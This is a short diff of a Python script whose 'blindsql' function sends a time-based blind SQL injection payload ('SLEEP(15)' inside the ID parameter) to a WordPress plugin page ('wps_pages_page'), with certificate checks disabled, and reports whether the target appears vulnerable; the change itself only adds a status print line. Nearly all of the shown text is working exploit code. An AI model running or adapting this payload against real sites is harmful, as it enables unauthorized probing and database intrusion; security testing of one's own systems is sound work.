@@ -9,6 +9,7 @@ def blindsql(url):
 	sleep = 15
 	payload="ID=1 AND (SELECT * from (select SLEEP(%s))a)"%(sleep)
 	url_encode = urlencode({'page':'wps_pages_page', 'type':'1', 'ID':payload}, quote_via=quote_plus)
+	print('(+) Trying Payload')
 	try:
 		requests.get(url_endpoint +'?'+ url_encode, headers={'User-Agent':ua}, timeout=10, verify=False)
 		print('(!) Target seem like not vuln!')
